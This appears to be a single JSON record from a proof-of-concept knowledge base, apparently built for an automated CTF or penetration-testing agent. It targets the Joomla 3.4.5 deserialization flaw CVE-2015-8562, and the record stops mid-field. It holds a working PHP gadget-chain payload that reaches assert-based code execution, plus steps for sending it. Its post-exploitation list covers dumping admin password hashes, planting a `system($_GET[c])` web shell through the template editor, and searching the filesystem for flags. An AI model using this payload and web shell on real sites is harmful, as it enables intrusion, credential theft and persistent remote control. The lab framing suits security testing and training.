{"id": "vulhub:joomla:cve-2015-8562", "kind": "poc", "title": "Joomla 3.4.5 反序列化漏洞（CVE-2015-8562）", "technique": "deserialization", "summary": "joomla / CVE-2015-8562。载荷取自上流 README 的复现段落，已按实例值参数化。", "preconditions": ["目标产品为 joomla，且版本落在 CVE-2015-8562 的影响范围内（先确认版本，再发载荷）", "README 中的服务端口需按实际目标替换"], "target_stack": ["joomla", "CVE-2015-8562"], "payload_template": "<?php\nclass JSimplepieFactory {\n}\nclass JDatabaseDriverMysql {\n\n}\nclass SimplePie {\n    var $sanitize;\n    var $cache;\n    var $cache_name_function;\n    var $javascript;\n    var $feed_url;\n    function __construct()\n    {\n        $this->feed_url = \"phpinfo();JFactory::getConfig();exit;\";\n        $this->javascript = 9999;\n        $this->cache_name_function = \"assert\";\n        $this->sanitize = new JDatabaseDriverMysql();\n        $this->cache = true;\n    }\n}\n\nclass JDatabaseDriverMysqli {\n    protected $a;\n    protected $disconnectHandlers;\n    protected $connection;\n    function __construct()\n    {\n        $this->a = new JSimplepieFactory();\n        $x = new SimplePie();\n        $this->connection = 1;\n        $this->disconnectHandlers = [\n            [$x, \"init\"],\n        ];\n    }\n}\n\n$a = new JDatabaseDriverMysqli();\n$poc = serialize($a); \n\n$poc = str_replace(\"\\x00*\\x00\", '\\\\0\\\\0\\\\0', $poc);\n\necho \"123}__test|{$poc}\\xF0\\x9D\\x8C\\x86\";", "verification_method": ["按 payload 原样发送；命中判据是响应出现该 CVE 的预期特征（回显、报错、状态码或读到的文件内容）。", "第一次没有预期响应时换下一条载荷，不要在同一句上反复微调。"], "known_failures": ["机制导入，从未在本平台靶机上验证过；版本不符时不会生效。"], "steps": ["确认 joomla 版本在 CVE-2015-8562 影响范围内", "把 payload 中的 {{target_url}} / {{host}} 换成实际目标", "发送并把响应与预期特征比对"], "post_exploitation": ["SQLi 只是入口：先 `select user,authentication_string from <db>.users` 拿管理员口令哈希，再用它登录 `/administrator` 后台。", "后台的模板编辑器可直接写 PHP：Extensions → Templates → 编辑 index.php，插入 `<?php system($_GET[c]);?>`，然后 `?c=id`。", "有了命令执行再 `printenv | grep -i flag` 与 `grep -rIl 'CTF{' /var/www /tmp` —— flag 在文件系统，不在 joomla 库里。"], "provenance":